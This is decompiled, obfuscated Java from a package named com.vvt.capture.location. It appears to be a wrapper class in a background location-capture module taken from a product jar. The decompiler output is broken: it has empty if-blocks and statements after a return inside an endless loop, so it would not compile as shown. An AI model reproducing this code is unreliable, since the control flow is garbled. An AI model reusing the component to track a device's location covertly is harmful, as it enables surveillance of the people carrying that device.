package com.vvt.capture.location;

import android.content.Context;
import com.vvt.base.RunningMode;

public class c implements a {
    private static final String a = d.a(c.class.getSimpleName());
    private boolean b;
    private a c;

    public c(RunningMode paramRunningMode, Context paramContext, String paramString)
    {
        boolean bool = com.vvt.ak.a.a;
        this.b = bool;
        bool = this.b;
        if (bool) {}
        Object localObject = RunningMode.FULL;
        if (paramRunningMode == localObject) {
            bool = true;
        }

        for (;;) {
            b localb = new com.vvt.capture.location.b();
            localObject = localb.a(bool, paramContext, paramString);
            this.c = ((a)localObject);
            bool = this.b;
            if (bool) {}
            bool = this.b;
            if (bool) {}
            return;
            bool = false;
            localObject = null;
        }
    }

    public void a(long paramLong) {
        boolean bool = this.b;
        if (bool) {}
        a locala = this.c;
        locala.a(paramLong);
        bool = this.b;
        if (bool) {}
    }

    public void a(CallingModule paramCallingModule)
    {
        boolean bool = this.b;
        if (bool) {}
        a locala = this.c;
        locala.a(paramCallingModule);
        bool = this.b;
        if (bool) {}
    }

    public void a(CallingModule paramCallingModule, com.vvt.base.a parama)
    {
        boolean bool = this.b;
        if (bool) {}
        a locala = this.c;
        locala.a(paramCallingModule, parama);
        bool = this.b;
        if (bool) {}
    }

    public boolean a()
    {
        return this.c.a();
    }

    public void b()
    {
        this.c.b();
    }

    public void b(CallingModule paramCallingModule)
    {
        boolean bool = this.b;
        if (bool) {}
        a locala = this.c;
        locala.b(paramCallingModule);
        bool = this.b;
        if (bool) {}
    }

    public void b(CallingModule paramCallingModule, com.vvt.base.a parama)
    {
        boolean bool = this.b;
        if (bool) {}
        a locala = this.c;
        locala.b(paramCallingModule, parama);
        bool = this.b;
        if (bool) {}
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/location/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */